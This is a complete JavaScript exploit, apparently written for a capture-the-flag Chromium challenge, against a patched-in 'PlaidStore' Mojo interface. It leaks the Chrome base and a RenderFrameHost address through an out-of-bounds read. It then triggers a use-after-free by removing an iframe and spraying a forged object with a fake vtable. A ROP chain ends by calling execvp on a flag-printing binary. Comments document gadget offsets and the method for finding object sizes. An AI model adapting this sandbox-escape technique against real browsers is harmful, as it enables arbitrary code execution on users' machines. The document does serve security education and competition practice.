async function a() {
	/*
	Leaking chrome base.
	+void PlaidStoreImpl::GetData(
	+    const std::string &key,
	+    uint32_t count,
	+    GetDataCallback callback) {
	+  if (!render_frame_host_->IsRenderFrameLive()) {
	+    std::move(callback).Run({});
	+    return;
	+  }
	+  auto it = data_store_.find(key);
	+  if (it == data_store_.end()) {
	+    std::move(callback).Run({});
	+    return;
	+  }
	+  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);//Lacking of bound-checking (count)-> OOB-Read
	+  std::move(callback).Run(result);
	+}
	Downthere, I store a 0x40 arrays of (0x28*8 bytes) to the plaidstore, while attempt to allocate PlaidStores.
	PlaidStoreImpl objects will have a pointer to vtable at offset 0 and render_frame_host_ at offset 8
	content::PlaidStoreImpl::PlaidStoreImpl is the constructor; it will set the vtable
	chrome[0x3c584a8] <+24>:  call   0x57044b0                 ; operator new(unsigned long)
	chrome[0x3c584ad] <+29>:  lea    rcx, [rip + 0x635e2ec]    ; vtable for content::PlaidStoreImpl + 16
	chrome[0x3c584b4] <+36>:  mov    qword ptr [rax], rcx
	>>> hex(0x3c584b4+0x635e2ec)
	'0x9fb67a0' -> the pointer(unslided) will be stored at offset 0
	Or (lldb) image lookup -r -v -s "vtable for content::PlaidStoreImpl"
	So we should find the pointer that looks like 0x5x..7a0
	The next 8 bytes will be the pointer to our render frame host.
	*/
	var stores = [];
	let p = blink.mojom.PlaidStore.getRemote(true);
	for(let i = 0;i< 0x40; i++ ){
		await p.storeData("yeet"+i,new Uint8Array(0x28).fill(0x41));
		stores[i] = blink.mojom.PlaidStore.getRemote(true);
	}
	let chromeBase = 0;
	let renderFrameHost = 0;
	for(let i = 0;i<0x40&&chromeBase==0;i++){
		let d = (await p.getData("yeet"+i,0x200)).data;
		let u8 = new Uint8Array(d)
		let u64 = new BigInt64Array(u8.buffer);
		for(let j = 5;j<u64.length;j++){
			let l = u64[j]&BigInt(0xf00000000000)
			let h = u64[j]&BigInt(0x000000000fff)
			if((l==BigInt(0x500000000000))&&h==BigInt(0x7a0)){
				console.log('0x'+u64[j].toString(16));
				chromeBase = u64[j]-BigInt(0x9fb67a0);
				renderFrameHost = u64[j+1];
				break;
			}
		}
	}
	console.log("Done")
	console.log("ChromeBase: 0x"+chromeBase.toString(16));
	console.log("renderFrameHost: 0x"+renderFrameHost.toString(16));
	const kRenderFrameHostSize = 0xc28;
	/*This constant can be find using the method belows
	content::RenderFrameHostImpl::RenderFrameHostImpl() is called after that C++ object is allocated.//constructor
	Searching in the chromium source, it's called from content::RenderFrameHostFactory::Create(), looking into that function...
	Just before the constructor is called, it's allocated using operator new(unsigned long size);
	So we can figure out the size using the nearest `new` from the constructor
	mov    edi, 0xc28; call operator new(); => size = 0xc28
	*/	
	/*
	//content::PlaidStoreImpl::StoreData
	chrome[0x3c581da] <+26>:  mov    rdi, qword ptr [rdi + 0x8] //rdi = this->render_frame_host_
	chrome[0x3c581de] <+30>:  mov    rax, qword ptr [rdi]//rax = vtable 
	chrome[0x3c581e1] <+33>:  call   qword ptr [rax + 0x160]//call vtable->IsRenderFrameLive
	UAF render_frame_host_ field, crafted vtable, RIP
	Because we can leak RenderFrameHost address, put crafted vtable and the stuffs that we need address in 0xc28 bytes of the fake object
	*/
	/*
	Now, we could build a ROP chain.
	0x9eff010: execve@plt
	0x9eff020: execv@plt
	0x9efca30: execvp@plt
	0x000000000880dee8 : xchg rax, rsp ; clc ; pop rbp ; ret
	0x0000000008d08a16 : xor rsi, rsi ; pop rbp ; jmp rax
	0x0000000002e651dd : pop rax ; ret
	0x0000000002e4630f : pop rdi ; ret
	*/
	var frameData = new ArrayBuffer(kRenderFrameHostSize);
	var frameData8 = new Uint8Array(frameData).fill(0x0);
	var frameDataView = new DataView(frameData)	
	var ropChainView = new BigInt64Array(frameData,0x10);
	frameDataView.setBigInt64(0x160+0x10,chromeBase + 0x880dee8n,true); //xchg rax, rsp 
	frameDataView.setBigInt64(0x180, 0x2f686f6d652f6368n,false);
	frameDataView.setBigInt64(0x188, 0x726f6d652f666c61n,false);
	frameDataView.setBigInt64(0x190, 0x675f7072696e7465n,false);// /home/chrome/flag_printer\0; big-endian
	frameDataView.setBigInt64(0x198, 0x7200000000000000n,false);// /home/chrome/flag_printer\0; big-endian
	ropChainView[0] = 0xdeadbeefn; // RIP rbp :<
	ropChainView[1] = chromeBase + 0x2e4630fn; //pop rdi;
	ropChainView[2] = 0x4141414141414141n; // frameaddr+0x180
	ropChainView[3] = chromeBase + 0x2e651ddn; // pop rax;
	ropChainView[4] = chromeBase + 0x9efca30n; // execve@plt
	ropChainView[5] = chromeBase + 0x8d08a16n; // xor rsi, rsi; pop rbp; jmp rax
	ropChainView[6] = 0xdeadbeefn; // rbp
	//Constrait: rdx = 0; rdi pointed to ./flag_reader\0
	var allocateFrame = () =>{
		var frame = document.createElement("iframe");
		frame.src = "/iframe.html"
		document.body.appendChild(frame);
		return frame;
	}
	var frame = allocateFrame();
	frame.contentWindow.addEventListener("DOMContentLoaded",async ()=>{
		if(!(await frame.contentWindow.leak())){
			console.log("frame leak failed!");
			return
		}
		if(frame.contentWindow.chromeBase!=chromeBase){
			console.log("different chrome base!! wtf!")
			return
		}	
		var frameAddr = frame.contentWindow.renderFrameHost;
		console.log("frame addr:0x"+frameAddr.toString(16));
		frameDataView.setBigInt64(0,frameAddr+0x10n,true); //vtable/ rax
		ropChainView[2] = frameAddr + 0x180n;
		//stashing the pointer of iframe.
		var frameStore = frame.contentWindow.p;
		//freeeee
		frame.remove();
		frame = 0;
		var arr = [];
		//Reallocate of RenderFrameHost with our controlled data.
		for(let i = 0;i< 0x400;i++){
			await p.storeData("bruh"+i,frameData8);
		}
		//go go
		await frameStore.getData("yeet0",0);
		
	});
}

document.addEventListener("DOMContentLoaded",()=>{a();});
